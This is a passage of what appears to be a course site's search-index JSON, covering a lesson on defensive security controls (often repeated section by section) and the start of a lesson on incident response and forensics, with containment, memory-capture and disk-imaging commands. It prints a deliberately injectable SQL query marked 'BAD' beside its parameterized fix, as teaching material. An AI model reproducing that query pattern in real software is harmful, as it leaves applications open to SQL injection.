- Authenticator apps (TOTP\u2014Google Authenticator, Authy) - Hardware tokens (YubiKey, U2F) - Push notifications (Duo, Okta) - Biometrics (as second factor) Passwordless authentication: - FIDO2/WebAuthn - Magic links - Biometrics alone (risky) Authorization Principle of Least Privilege: Give users minimum access needed for their job. Role-Based Access Control (RBAC): Roles: - Admin: Full access - Developer: Read/write code, read logs - Analyst: Read-only access - Guest: Limited access to specific resources Review access regularly: - Quarterly access reviews - Remove access for departures - Adjust for role changes - Audit privileged accounts Privileged Access Management (PAM) Special controls for admin accounts: Just-in-time access : Temporary elevation when needed Session recording : Record all admin actions MFA required : Extra authentication for privilege Approval workflows : Manager approval for sensitive access Credential vaulting : Store admin passwords securely Data Protection Data Classification Categories: - Public : No harm if disclosed - Internal : Some harm, limited to organization - Confidential : Significant harm, limited to need-to-know - Restricted : Severe harm, heavily protected (PII, financial, trade secrets) Different controls by classification: Public: Basic security Internal: Access controls, encryption in transit Confidential: Strong encryption, MFA, monitoring Restricted: Strongest encryption, audit logging, DLP, isolated systems Encryption At rest : Encrypt stored data - Full disk encryption (BitLocker, FileVault, LUKS) - Database encryption (TDE - Transparent Data Encryption) - File/folder encryption In transit : Encrypt data moving across networks - TLS 1.3 for web traffic - VPN for remote access - SSH for remote administration - Encrypted email (S/MIME, PGP) Key management: - Hardware Security Modules (HSM) - Key Management Service (KMS) - Regular key rotation - Secure key storage Data Loss Prevention (DLP) Prevent unauthorized data exfiltration. Techniques: - Content inspection (scan for credit cards, SSNs, etc.) - Contextual analysis (who, what, where, when) - Pattern matching (regex for sensitive data) - Fingerprinting (track specific documents) Enforcement points: - Network DLP (monitor network traffic) - Endpoint DLP (control USB, email, uploads) - Cloud DLP (monitor cloud services) Actions: - Block: Prevent transfer - Quarantine: Hold for review - Alert: Notify security team - Encrypt: Allow with encryption Backup and Recovery 3-2-1 Rule: - 3 copies of data - 2 different media types - 1 offsite backup Testing backups: - Regular restore tests - Verify data integrity - Document restore procedures - Time recovery objectives (RTO) Ransomware protection: - Immutable backups (can't be encrypted) - Air-gapped backups (offline) - Version history - Rapid recovery capability Security Monitoring Logging What to log: - Authentication attempts (success and failure) - Authorization changes - System changes - Network connections - File access - Application events - Security alerts Log management: - Centralized collection (Syslog, SIEM) - Adequate retention (comply with policies/regulations) - Protection from tampering - Regular review SIEM (Security Information and Event Management) Centralized platform for security monitoring. Capabilities: - Log aggregation - Correlation (connect related events) - Alerting - Dashboards - Incident investigation - Compliance reporting Popular SIEM solutions: - Splunk - ELK Stack (Elasticsearch, Logstash, Kibana) - QRadar - ArcSight - Sentinel Use cases: - Detect brute force attacks (multiple failed logins) - Identify compromised accounts (unusual access patterns) - Track lateral movement - Detect data exfiltration - Compliance monitoring Security Orchestration, Automation and Response (SOAR) Automates security operations: Capabilities: - Automated threat intelligence gathering - Automated response actions - Workflow orchestration - Case management - Playbooks for common scenarios Example automated response: 1. Alert: Multiple failed logins detected 2. SOAR enriches: Geolocate IP, check threat intel 3. SOAR decides: IP on blacklist \u2192 Block automatically 4. SOAR acts: Update firewall, disable account, create ticket 5. SOAR notifies: Alert analyst Incident Response Incident Response Plan Preparation: - Define roles and responsibilities - Create playbooks for common incidents - Establish communication channels - Maintain contact lists - Regular training and drills Detection and Analysis: - Monitor alerts - Triage incidents - Determine scope and severity - Preserve evidence Containment: - Short-term: Isolate affected systems - Long-term: Patch vulnerabilities, rebuild systems Eradication: - Remove malware - Close attack vectors - Patch vulnerabilities Recovery: - Restore systems from clean backups - Verify systems are clean - Monitor for reinfection Lessons Learned: - Post-incident review - Document what happened - Identify improvements - Update procedures Forensics Evidence handling: - Chain of custody documentation - Bit-for-bit disk imaging - Write blockers (prevent evidence modification) - Hash verification (prove integrity) Analysis: - File system analysis - Memory analysis - Network traffic analysis - Log analysis - Malware analysis Tools: - FTK (Forensic Toolkit) - EnCase - Autopsy - Volatility (memory forensics) - Wireshark (network forensics) Security Testing Vulnerability Assessment Regular scanning for vulnerabilities: Tools: - Nessus - OpenVAS - Qualys - Rapid7 Process: 1. Scan systems 2. Identify vulnerabilities 3. Assess risk 4. Prioritize remediation 5. Verify fixes Penetration Testing Authorized simulated attacks to find weaknesses. Types: - Black box : No inside knowledge - White box : Full knowledge of systems - Gray box : Partial knowledge Methodology: 1. Planning and reconnaissance 2. Scanning 3. Gaining access 4. Maintaining access 5. Analysis and reporting Important: - Written authorization (scope, timing, methods) - Rules of engagement - Non-disclosure agreements - Clear reporting of findings Red Team / Blue Team Exercises Red Team : Offensive security, simulates attackers Blue Team : Defensive security, protects systems Purple Team : Red and blue working together Benefits: - Test detection capabilities - Validate response procedures - Identify gaps - Train staff User Security Awareness Humans are often the weakest link. Training Topics Phishing recognition: - Suspicious sender addresses - Urgent language - Requests for credentials - Unexpected attachments - Hover before clicking links Password security: - Strong, unique passwords - Password manager usage - MFA enrollment - Never share passwords Physical security: - Lock workstations - Secure documents - Visitor badges - Clean desk policy Reporting: - How to report suspicious activity - No punishment for good-faith reports - Encourage security culture Simulated Phishing Send fake phishing emails to test awareness: - Track click rates - Provide immediate training - Improve over time - No punishment, only education Vulnerability Management Process 1. Discovery : Identify all assets 2. Prioritization : Risk-based approach - CVSS score (severity) - Exploitability - Asset criticality - Threat intelligence 3. Remediation : Fix vulnerabilities - Patching - Configuration changes - Compensating controls 4. Verification : Confirm fixes work 5. Continuous monitoring : Ongoing process Metrics Track security posture: - Mean time to detect (MTTD) - Mean time to respond (MTTR) - Number of vulnerabilities (by severity) - Patch compliance rates - Time to patch critical vulnerabilities Security Policies and Governance Key Policies Acceptable Use Policy : What users can do with IT resources Data Classification Policy : How to handle different data types Password Policy : Password requirements Remote Access Policy : VPN and remote work rules Incident Response Policy : How to handle incidents Change Management Policy : How changes are made Compliance Regulations vary by industry: - GDPR : EU data protection - HIPAA : US healthcare data - PCI DSS : Payment card data - SOX : Financial reporting - FISMA : US government systems Compliance requirements drive security controls. Key Takeaways Effective defense requires: 1. Defense in depth : Multiple layers 2. Security frameworks : Structured approach 3. Continuous monitoring : Detect threats 4. Regular testing : Find gaps before attackers do 5. User training : Address human element 6. Incident response : Prepare for breaches 7. Continuous improvement : Learn and adapt Remember : Perfect security is impossible. The goal is: - Make attacks difficult and expensive - Detect attacks quickly - Respond effectively - Minimize damage - Recover rapidly - Learn from incidents Security is a process, not a destination. Threats evolve, so defenses must evolve too. In the final lesson, we'll explore encryption systems in depth, bringing together cryptographic concepts with practical implementation.","title":"Lesson 10.1"},{"location":"LECTURES/unit10/lesson10-1/#how-do-we-protect-against-this-protection-prevention","text":"You've learned how attacks work. Now let's talk about defense. This is where theory meets practice\u2014implementing security controls that actually protect systems and data. Defense is harder than offense, but with the right strategies and tools, it's achievable.","title":"How Do We Protect Against This? (Protection &amp; Prevention)"},{"location":"LECTURES/unit10/lesson10-1/#defense-in-depth","text":"The fundamental principle: never rely on a single security control . Layer multiple defenses so if one fails, others still protect you. Think of a medieval castle: - Moat (perimeter defense) - Outer walls (firewall) - Inner walls (network segmentation) - Guards (monitoring) - Vault (encryption) - Drawbridge (access control) Multiple obstacles make successful attack much harder. Apply to IT: - Network firewall - IDS/IPS - Endpoint protection - Access controls - Encryption - Security monitoring - User training - Incident response plans If attackers bypass the firewall, they still face IDS, endpoint protection, monitoring, etc.","title":"Defense in Depth"},{"location":"LECTURES/unit10/lesson10-1/#security-frameworks","text":"Organizations use security frameworks to structure their defense:","title":"Security Frameworks"},{"location":"LECTURES/unit10/lesson10-1/#nist-cybersecurity-framework","text":"Five core functions: 1. Identify - Asset management (know what you have) - Risk assessment - Governance 2. Protect - Access control - Data security - Security training - Protective technology 3. Detect - Monitoring - Anomaly detection - Security events 4. Respond - Response planning - Communication - Analysis - Mitigation - Improvements 5. Recover - Recovery planning - Improvements - Communication","title":"NIST Cybersecurity Framework"},{"location":"LECTURES/unit10/lesson10-1/#iso-2700127002","text":"International standards for information security management. Domains: - Security policy - Organization of information security - Asset management - Access control - Cryptography - Physical security - Operations security - Communications security - System development security - Supplier relationships - Incident management - Business continuity - Compliance","title":"ISO 27001/27002"},{"location":"LECTURES/unit10/lesson10-1/#cis-controls","text":"Center for Internet Security Critical Security Controls \u2014prioritized, actionable defenses: Basic Controls (do these first): 1. Inventory and control of hardware assets 2. Inventory and control of software assets 3. Continuous vulnerability management 4. Controlled use of administrative privileges 5. Secure configuration for hardware and software 6. Maintenance, monitoring, and analysis of audit logs Foundational Controls: 7-16 (email security, malware defenses, data recovery, etc.) Organizational Controls: 17-20 (incident response, penetration testing, etc.)","title":"CIS Controls"},{"location":"LECTURES/unit10/lesson10-1/#network-security","text":"","title":"Network Security"},{"location":"LECTURES/unit10/lesson10-1/#firewalls-revisited","text":"Implementation best practices: Default deny : Block everything, explicitly allow only what's needed # Bad: Allow everything except specific blocks # Good: Block everything except specific allows Least privilege : Only allow minimum necessary access Rule ordering matters : More specific rules first 1. Allow 192.168.1.50:443 to any (specific) 2. Block 192.168.1.0/24 to any (general) Regular review : Remove unused rules, ensure rules still needed Stateful inspection : Track connection state, not just individual packets Application-level filtering : Inspect actual content, not just headers","title":"Firewalls (Revisited)"},{"location":"LECTURES/unit10/lesson10-1/#intrusion-detectionprevention-systems","text":"Signature-based detection: - Matches known attack patterns - Fast and accurate for known threats - Can't detect new attacks Anomaly-based detection: - Establishes baseline of normal behavior - Detects deviations - Can find zero-day attacks - Higher false positive rate Behavioral analysis: - Looks for suspicious behaviors (port scanning, failed logins) - Useful for insider threats Deployment: - Inline (IPS) : Can block attacks, but adds latency - Out-of-band (IDS) : Monitor-only, no impact on traffic flow Tuning is critical: - Too sensitive \u2192 false positives, alert fatigue - Too permissive \u2192 miss real attacks - Continuous tuning based on environment","title":"Intrusion Detection/Prevention Systems"},{"location":"LECTURES/unit10/lesson10-1/#network-segmentation","text":"Microsegmentation : Divide network into small zones Implementation: - VLANs for logical separation - Firewalls between segments - Zero Trust principles Example segmentation: [Internet] \u2193 [DMZ] - Public web servers \u2193 [Firewall] \u2193 [Internal Network] \u251c\u2500 [Employee Network] \u251c\u2500 [Server Network] \u251c\u2500 [Development Network] \u2514\u2500 [IoT/Guest Network] Each segment has appropriate controls and isolation.","title":"Network Segmentation"},{"location":"LECTURES/unit10/lesson10-1/#network-access-control-nac","text":"Pre-connection checks: 1. Device identification 2. Authentication 3. Compliance check (OS patches, antivirus updated) 4. Authorization (what can you access?) Enforcement: - Full access (compliant, authorized) - Quarantine (needs updates) - Guest access (untrusted devices) - Denied (failed checks) 802.1X : Port-based network access control - User/device authentication before network access - RADIUS server validates credentials - Switch grants or denies access","title":"Network Access Control (NAC)"},{"location":"LECTURES/unit10/lesson10-1/#endpoint-security","text":"Endpoints (desktops, laptops, servers, mobile devices) are common attack targets.","title":"Endpoint Security"},{"location":"LECTURES/unit10/lesson10-1/#antivirus-anti-malware","text":"Traditional antivirus: - Signature-based detection - Effective against known malware - Signature database must be updated Next-gen antivirus (NGAV): - Machine learning - Behavioral analysis - Cloud-based threat intelligence - Can detect unknown malware Endpoint Detection and Response (EDR): - Continuous monitoring - Threat detection - Investigation capabilities - Automated response - Forensics data","title":"Antivirus / Anti-Malware"},{"location":"LECTURES/unit10/lesson10-1/#host-based-firewall","text":"Software firewall on individual systems. Benefits: - Controls traffic to/from specific applications - Last line of defense - Protects even on untrusted networks Configuration: # Linux (iptables example) iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT iptables -A INPUT -p tcp --dport 22 -j ACCEPT iptables -A INPUT -p tcp --dport 80 -j ACCEPT iptables -A INPUT -j DROP # Default deny # Windows New-NetFirewallRule -DisplayName \"Allow SSH\" -Direction Inbound -LocalPort 22 -Protocol TCP -Action Allow","title":"Host-Based Firewall"},{"location":"LECTURES/unit10/lesson10-1/#application-whitelisting","text":"Only approved applications can run. Benefits: - Prevents unauthorized software execution - Stops most malware - Reduces attack surface Challenges: - Management overhead - User resistance - Needs accurate software inventory Tools: Windows AppLocker, Carbon Black, bit9","title":"Application Whitelisting"},{"location":"LECTURES/unit10/lesson10-1/#patch-management","text":"Unpatched systems are low-hanging fruit for attackers. Process: 1. Inventory all systems and software 2. Monitor for new patches 3. Test patches in non-production 4. Deploy in stages 5. Verify successful installation 6. Document exceptions Prioritization: - Critical systems first - Publicly known vulnerabilities - Exploits in the wild - CVSS severity scores Challenges: - Patch compatibility issues - Downtime for patching - Legacy systems that can't be patched Virtual patching : IPS rules that protect unpatched systems","title":"Patch Management"},{"location":"LECTURES/unit10/lesson10-1/#application-security","text":"","title":"Application Security"},{"location":"LECTURES/unit10/lesson10-1/#secure-development-lifecycle-sdl","text":"Security integrated into development process: Requirements phase: - Define security requirements - Threat modeling Design phase: - Security architecture - Review design for vulnerabilities Implementation phase: - Secure coding practices - Code review - Static analysis Testing phase: - Security testing - Penetration testing - Dynamic analysis Deployment phase: - Secure configuration - Hardening Maintenance phase: - Patch management - Monitoring - Incident response","title":"Secure Development Lifecycle (SDL)"},{"location":"LECTURES/unit10/lesson10-1/#input-validation","text":"Never trust user input. Whitelist validation (preferred): # Good: Only allow expected characters import re if re.match(r'^[a-zA-Z0-9_]{3,20}$', username): # Process username else: # Reject Blacklist validation (less secure): # Bad: Try to block malicious input # Attackers find ways around blacklists Validation rules: - Type (string, integer, email) - Length (min/max) - Format (regex pattern) - Range (numerical bounds) - Charset (allowed characters) Sanitization: import html safe_output = html.escape(user_input) # Prevents XSS","title":"Input Validation"},{"location":"LECTURES/unit10/lesson10-1/#parameterized-queries","text":"Prevents SQL injection: Vulnerable: # BAD query = f\"SELECT * FROM users WHERE id = {user_id}\" cursor.execute(query) Secure: # GOOD query = \"SELECT * FROM users WHERE id = ?\" cursor.execute(query, (user_id,)) The database properly handles user input, preventing injection.","title":"Parameterized Queries"},{"location":"LECTURES/unit10/lesson10-1/#output-encoding","text":"Prevents XSS: # Encode for HTML context safe_html = html.escape(user_data) # Encode for JavaScript context safe_js = json.dumps(user_data) # Encode for URL context safe_url = urllib.parse.quote(user_data) Context-appropriate encoding is crucial.","title":"Output Encoding"},{"location":"LECTURES/unit10/lesson10-1/#web-application-firewall-waf","text":"Filters HTTP/HTTPS traffic to web applications. Protection against: - SQL injection - XSS - CSRF - File inclusion - DDoS Modes: - Blacklist (negative security): Block known attacks - Whitelist (positive security): Allow only known good traffic Popular WAFs: - ModSecurity (open-source) - Cloudflare WAF - AWS WAF - Azure WAF - Imperva","title":"Web Application Firewall (WAF)"},{"location":"LECTURES/unit10/lesson10-1/#security-headers","text":"HTTP response headers that enhance security: Content-Security-Policy: default-src 'self' X-Frame-Options: DENY X-Content-Type-Options: nosniff Strict-Transport-Security: max-age=31536000 X-XSS-Protection: 1; mode=block Referrer-Policy: no-referrer Benefits: - Prevent clickjacking - Enforce HTTPS - Mitigate XSS - Control resource loading","title":"Security Headers"},{"location":"LECTURES/unit10/lesson10-1/#access-control","text":"","title":"Access Control"},{"location":"LECTURES/unit10/lesson10-1/#authentication","text":"Password security: - Minimum length (12+ characters) - Complexity requirements - Password history (prevent reuse) - Expiration policies (controversial) - Account lockout after failed attempts - Password managers encouraged Multi-Factor Authentication (MFA): Require multiple factors: Something you know (password) + Something you have (phone, token) + Something you are (biometric) MFA methods: - SMS codes (weak, vulnerable to SIM swapping) - Authenticator apps (TOTP\u2014Google Authenticator, Authy) - Hardware tokens (YubiKey, U2F) - Push notifications (Duo, Okta) - Biometrics (as second factor) Passwordless authentication: - FIDO2/WebAuthn - Magic links - Biometrics alone (risky)","title":"Authentication"},{"location":"LECTURES/unit10/lesson10-1/#authorization","text":"Principle of Least Privilege: Give users minimum access needed for their job. Role-Based Access Control (RBAC): Roles: - Admin: Full access - Developer: Read/write code, read logs - Analyst: Read-only access - Guest: Limited access to specific resources Review access regularly: - Quarterly access reviews - Remove access for departures - Adjust for role changes - Audit privileged accounts","title":"Authorization"},{"location":"LECTURES/unit10/lesson10-1/#privileged-access-management-pam","text":"Special controls for admin accounts: Just-in-time access : Temporary elevation when needed Session recording : Record all admin actions MFA required : Extra authentication for privilege Approval workflows : Manager approval for sensitive access Credential vaulting : Store admin passwords securely","title":"Privileged Access Management (PAM)"},{"location":"LECTURES/unit10/lesson10-1/#data-protection","text":"","title":"Data Protection"},{"location":"LECTURES/unit10/lesson10-1/#data-classification","text":"Categories: - Public : No harm if disclosed - Internal : Some harm, limited to organization - Confidential : Significant harm, limited to need-to-know - Restricted : Severe harm, heavily protected (PII, financial, trade secrets) Different controls by classification: Public: Basic security Internal: Access controls, encryption in transit Confidential: Strong encryption, MFA, monitoring Restricted: Strongest encryption, audit logging, DLP, isolated systems","title":"Data Classification"},{"location":"LECTURES/unit10/lesson10-1/#encryption","text":"At rest : Encrypt stored data - Full disk encryption (BitLocker, FileVault, LUKS) - Database encryption (TDE - Transparent Data Encryption) - File/folder encryption In transit : Encrypt data moving across networks - TLS 1.3 for web traffic - VPN for remote access - SSH for remote administration - Encrypted email (S/MIME, PGP) Key management: - Hardware Security Modules (HSM) - Key Management Service (KMS) - Regular key rotation - Secure key storage","title":"Encryption"},{"location":"LECTURES/unit10/lesson10-1/#data-loss-prevention-dlp","text":"Prevent unauthorized data exfiltration. Techniques: - Content inspection (scan for credit cards, SSNs, etc.) - Contextual analysis (who, what, where, when) - Pattern matching (regex for sensitive data) - Fingerprinting (track specific documents) Enforcement points: - Network DLP (monitor network traffic) - Endpoint DLP (control USB, email, uploads) - Cloud DLP (monitor cloud services) Actions: - Block: Prevent transfer - Quarantine: Hold for review - Alert: Notify security team - Encrypt: Allow with encryption","title":"Data Loss Prevention (DLP)"},{"location":"LECTURES/unit10/lesson10-1/#backup-and-recovery","text":"3-2-1 Rule: - 3 copies of data - 2 different media types - 1 offsite backup Testing backups: - Regular restore tests - Verify data integrity - Document restore procedures - Time recovery objectives (RTO) Ransomware protection: - Immutable backups (can't be encrypted) - Air-gapped backups (offline) - Version history - Rapid recovery capability","title":"Backup and Recovery"},{"location":"LECTURES/unit10/lesson10-1/#security-monitoring","text":"","title":"Security Monitoring"},{"location":"LECTURES/unit10/lesson10-1/#logging","text":"What to log: - Authentication attempts (success and failure) - Authorization changes - System changes - Network connections - File access - Application events - Security alerts Log management: - Centralized collection (Syslog, SIEM) - Adequate retention (comply with policies/regulations) - Protection from tampering - Regular review","title":"Logging"},{"location":"LECTURES/unit10/lesson10-1/#siem-security-information-and-event-management","text":"Centralized platform for security monitoring. Capabilities: - Log aggregation - Correlation (connect related events) - Alerting - Dashboards - Incident investigation - Compliance reporting Popular SIEM solutions: - Splunk - ELK Stack (Elasticsearch, Logstash, Kibana) - QRadar - ArcSight - Sentinel Use cases: - Detect brute force attacks (multiple failed logins) - Identify compromised accounts (unusual access patterns) - Track lateral movement - Detect data exfiltration - Compliance monitoring","title":"SIEM (Security Information and Event Management)"},{"location":"LECTURES/unit10/lesson10-1/#security-orchestration-automation-and-response-soar","text":"Automates security operations: Capabilities: - Automated threat intelligence gathering - Automated response actions - Workflow orchestration - Case management - Playbooks for common scenarios Example automated response: 1. Alert: Multiple failed logins detected 2. SOAR enriches: Geolocate IP, check threat intel 3. SOAR decides: IP on blacklist \u2192 Block automatically 4. SOAR acts: Update firewall, disable account, create ticket 5. SOAR notifies: Alert analyst","title":"Security Orchestration, Automation and Response (SOAR)"},{"location":"LECTURES/unit10/lesson10-1/#incident-response","text":"","title":"Incident Response"},{"location":"LECTURES/unit10/lesson10-1/#incident-response-plan","text":"Preparation: - Define roles and responsibilities - Create playbooks for common incidents - Establish communication channels - Maintain contact lists - Regular training and drills Detection and Analysis: - Monitor alerts - Triage incidents - Determine scope and severity - Preserve evidence Containment: - Short-term: Isolate affected systems - Long-term: Patch vulnerabilities, rebuild systems Eradication: - Remove malware - Close attack vectors - Patch vulnerabilities Recovery: - Restore systems from clean backups - Verify systems are clean - Monitor for reinfection Lessons Learned: - Post-incident review - Document what happened - Identify improvements - Update procedures","title":"Incident Response Plan"},{"location":"LECTURES/unit10/lesson10-1/#forensics","text":"Evidence handling: - Chain of custody documentation - Bit-for-bit disk imaging - Write blockers (prevent evidence modification) - Hash verification (prove integrity) Analysis: - File system analysis - Memory analysis - Network traffic analysis - Log analysis - Malware analysis Tools: - FTK (Forensic Toolkit) - EnCase - Autopsy - Volatility (memory forensics) - Wireshark (network forensics)","title":"Forensics"},{"location":"LECTURES/unit10/lesson10-1/#security-testing","text":"","title":"Security Testing"},{"location":"LECTURES/unit10/lesson10-1/#vulnerability-assessment","text":"Regular scanning for vulnerabilities: Tools: - Nessus - OpenVAS - Qualys - Rapid7 Process: 1. Scan systems 2. Identify vulnerabilities 3. Assess risk 4. Prioritize remediation 5. Verify fixes","title":"Vulnerability Assessment"},{"location":"LECTURES/unit10/lesson10-1/#penetration-testing","text":"Authorized simulated attacks to find weaknesses. Types: - Black box : No inside knowledge - White box : Full knowledge of systems - Gray box : Partial knowledge Methodology: 1. Planning and reconnaissance 2. Scanning 3. Gaining access 4. Maintaining access 5. Analysis and reporting Important: - Written authorization (scope, timing, methods) - Rules of engagement - Non-disclosure agreements - Clear reporting of findings","title":"Penetration Testing"},{"location":"LECTURES/unit10/lesson10-1/#red-team-blue-team-exercises","text":"Red Team : Offensive security, simulates attackers Blue Team : Defensive security, protects systems Purple Team : Red and blue working together Benefits: - Test detection capabilities - Validate response procedures - Identify gaps - Train staff","title":"Red Team / Blue Team Exercises"},{"location":"LECTURES/unit10/lesson10-1/#user-security-awareness","text":"Humans are often the weakest link.","title":"User Security Awareness"},{"location":"LECTURES/unit10/lesson10-1/#training-topics","text":"Phishing recognition: - Suspicious sender addresses - Urgent language - Requests for credentials - Unexpected attachments - Hover before clicking links Password security: - Strong, unique passwords - Password manager usage - MFA enrollment - Never share passwords Physical security: - Lock workstations - Secure documents - Visitor badges - Clean desk policy Reporting: - How to report suspicious activity - No punishment for good-faith reports - Encourage security culture","title":"Training Topics"},{"location":"LECTURES/unit10/lesson10-1/#simulated-phishing","text":"Send fake phishing emails to test awareness: - Track click rates - Provide immediate training - Improve over time - No punishment, only education","title":"Simulated Phishing"},{"location":"LECTURES/unit10/lesson10-1/#vulnerability-management","text":"","title":"Vulnerability Management"},{"location":"LECTURES/unit10/lesson10-1/#process","text":"1. Discovery : Identify all assets 2. Prioritization : Risk-based approach - CVSS score (severity) - Exploitability - Asset criticality - Threat intelligence 3. Remediation : Fix vulnerabilities - Patching - Configuration changes - Compensating controls 4. Verification : Confirm fixes work 5. Continuous monitoring : Ongoing process","title":"Process"},{"location":"LECTURES/unit10/lesson10-1/#metrics","text":"Track security posture: - Mean time to detect (MTTD) - Mean time to respond (MTTR) - Number of vulnerabilities (by severity) - Patch compliance rates - Time to patch critical vulnerabilities","title":"Metrics"},{"location":"LECTURES/unit10/lesson10-1/#security-policies-and-governance","text":"","title":"Security Policies and Governance"},{"location":"LECTURES/unit10/lesson10-1/#key-policies","text":"Acceptable Use Policy : What users can do with IT resources Data Classification Policy : How to handle different data types Password Policy : Password requirements Remote Access Policy : VPN and remote work rules Incident Response Policy : How to handle incidents Change Management Policy : How changes are made","title":"Key Policies"},{"location":"LECTURES/unit10/lesson10-1/#compliance","text":"Regulations vary by industry: - GDPR : EU data protection - HIPAA : US healthcare data - PCI DSS : Payment card data - SOX : Financial reporting - FISMA : US government systems Compliance requirements drive security controls.","title":"Compliance"},{"location":"LECTURES/unit10/lesson10-1/#key-takeaways","text":"Effective defense requires: 1. Defense in depth : Multiple layers 2. Security frameworks : Structured approach 3. Continuous monitoring : Detect threats 4. Regular testing : Find gaps before attackers do 5. User training : Address human element 6. Incident response : Prepare for breaches 7. Continuous improvement : Learn and adapt Remember : Perfect security is impossible. The goal is: - Make attacks difficult and expensive - Detect attacks quickly - Respond effectively - Minimize damage - Recover rapidly - Learn from incidents Security is a process, not a destination. Threats evolve, so defenses must evolve too. In the final lesson, we'll explore encryption systems in depth, bringing together cryptographic concepts with practical implementation.","title":"Key Takeaways"},{"location":"LECTURES/unit10/lesson10-2/","text":"Incident Response and Digital Forensics When prevention fails, incident response saves the day. This lesson covers how to detect, respond to, and recover from security incidents while preserving evidence for investigation and potential legal proceedings. Incident Response Framework NIST Incident Response Lifecycle 4 phases: Preparation - Build capability before incident occurs Detection & Analysis - Identify and understand incident Containment, Eradication & Recovery - Stop damage and restore Post-Incident Activity - Learn and improve SANS Incident Response Process 6 steps: Preparation - Tools, training, policies Identification - Detect and verify incident Containment - Limit damage Eradication - Remove threat Recovery - Restore systems Lessons Learned - Document and improve Preparation Phase Building an Incident Response Team Core roles: Incident Response Manager - Coordinates response - Makes critical decisions - Communicates with stakeholders - Manages resources Security Analyst - Analyzes alerts and logs - Identifies indicators of compromise - Performs triage - Documents findings Forensic Investigator - Preserves evidence - Analyzes systems - Reconstructs events - Prepares reports System Administrator - Provides technical access - Implements containment - Restores systems - Maintains business operations Legal Counsel - Advises on legal obligations - Manages law enforcement interaction - Protects attorney-client privilege - Handles disclosure requirements Communications Lead - Internal communications - External communications - Media relations - Customer notifications Essential Tools Network monitoring: - Wireshark / tcpdump - Zeek (Bro) - Security Onion - Suricata / Snort Endpoint detection: - OSSEC / Wazuh - Sysmon - osquery - Velociraptor Memory analysis: - Volatility - Rekall - WinDbg Disk forensics: - Autopsy / Sleuth Kit - FTK Imager - EnCase - X-Ways Forensics Log analysis: - ELK Stack (Elasticsearch, Logstash, Kibana) - Splunk - Graylog Malware analysis: - Cuckoo Sandbox - REMnux - FLARE VM - IDA Pro / Ghidra Incident Response Plan Key components: 1. Contact Information - Team members (phone, email, backup) - Vendors (IT, security, legal) - Law enforcement - Insurance 2. Roles and Responsibilities - Who does what - Decision authority - Escalation paths 3. Communication Plan - Internal notifications - External notifications - Media statements - Customer communications 4. Detection and Analysis - Alert sources - Triage procedures - Severity classification - Documentation requirements 5. Containment Strategies - Network isolation procedures - Account disabling - System shutdown criteria 6. Evidence Collection - Chain of custody forms - Collection procedures - Storage requirements 7. Eradication and Recovery - Malware removal - System rebuild - Verification procedures 8. Post-Incident - Lessons learned template - Improvement tracking Detection & Analysis Indicators of Compromise (IOCs) Network IOCs: - Suspicious IP addresses - Unusual DNS queries - C2 beacon patterns - Large data transfers - Connections to known bad domains Host IOCs: - Unexpected processes - New user accounts - Modified system files - Suspicious registry keys - Scheduled tasks - Unknown services Application IOCs: - Failed login attempts - Privilege escalation - Unusual access patterns - Error messages - Configuration changes Alert Triage Priority classification: Critical (P1): - Active data exfiltration - Ransomware execution - System compromise with admin access - Critical infrastructure impact - Response time: Immediate High (P2): - Malware detected - Privilege escalation attempt - Credential compromise - Response time: < 1 hour Medium (P3): - Policy violation - Suspicious activity - Reconnaissance detected - Response time: < 4 hours Low (P4): - Failed attack attempt - Scanner activity - False positive likely - Response time: < 24 hours Initial Analysis Questions to answer: What happened? Type of incident Attack vector Malware involved When did it start? First compromise Detection time Dwell time What systems affected? Compromised hosts Accessed data Network segments Who is the attacker? Internal/external Sophistication level Possible attribution What's the impact? Data loss System availability Business impact Containment Short-term Containment Immediate actions to limit damage: Network isolation: # Isolate host using firewall iptables -I INPUT 1 -s <attacker_ip> -j DROP iptables -I OUTPUT 1 -d <attacker_ip> -j DROP # Or disconnect network entirely ifconfig eth0 down # On Windows netsh interface set interface \"Ethernet\" admin=disable Account suspension: # Disable compromised user (Linux) passwd -l username usermod -L username # Disable AD account (Windows) Disable-ADAccount -Identity username # Force password reset Set-ADAccountPassword -Identity username -Reset Block malicious IPs: # Firewall rules ufw deny from <malicious_ip> # At network level (contact network team) # Block at firewall/IDS Long-term Containment Allows business to continue while preparing for eradication: Segment network: - Move affected systems to isolated VLAN - Restrict traffic flow - Monitor for lateral movement Apply patches: - Patch exploited vulnerabilities - Update signatures - Harden configurations Strengthen authentication: - Force password resets - Implement MFA - Review permissions Evidence Collection Order of Volatility Collect most volatile data first: Registers, cache - Nanoseconds Memory (RAM) - Seconds to minutes Network connections - Seconds Running processes - Seconds Open files - Minutes Network configuration - Minutes Disk contents - Hours to days Logs - Days to months Backups - Months to years Memory Acquisition Linux: # Using LiME (Linux Memory Extractor) sudo insmod lime.ko \"path=/tmp/memory.dump format=lime\" # Or dump with dd (less reliable) sudo dd if=/dev/mem of=/tmp/memory.dump bs=1M Windows: # Using WinPMEM winpmem.exe memory.dump # Using DumpIt DumpIt.exe # Using FTK Imager # GUI tool - select Capture Memory Memory analysis: # Volatility framework volatility -f memory.dump imageinfo # List processes volatility -f memory.dump --profile=Win10x64 pslist # Network connections volatility -f memory.dump --profile=Win10x64 netscan # List DLLs volatility -f memory.dump --profile=Win10x64 dlllist # Dump process volatility -f memory.dump --profile=Win10x64 procdump -p 1234 -D output/ # Scan for malware volatility -f memory.dump --profile=Win10x64 malfind Disk Acquisition Create forensic image: # Using dd (forensic copy) sudo dd if=/dev/sda of=/mnt/evidence/disk.img bs=4M status=progress conv=noerror,sync # Calculate hash sha256sum /mnt/evidence/disk.img > /mnt/evidence/disk.img.sha256 # Using dcfldd (better for forensics) sudo dcfldd if=/dev/sda of=/mnt/evidence/disk.img hash=sha256 hashlog=/mnt/evidence/hash.log # Using FTK Imager (Windows GUI) # File \u2192 Create Disk Image \u2192 Select source \u2192 Create image Mount as read-only: # Mount forensic image sudo mount -o ro,loop disk.img /mnt/evidence # Or use write blocker hardware Network Evidence Capture live traffic: # Full packet capture sudo tcpdump -i eth0 -w incident.pcap # Capture specific host sudo tcpdump -i eth0 host 192.168.1.100 -w suspect.pcap # Capture for specific time timeout 3600 sudo tcpdump -i eth0 -w hourly.pcap Export NetFlow data: # Export flows from router/switch # Query flow collector for incident timeframe nfdump -R /data/flows -t 2024-01-15.14:00-2024-01-15.16:00 -o extended Log Collection Centralized logging: # Linux system logs sudo cp -r /var/log /mnt/evidence/logs/ # Windows Event logs wevtutil epl System 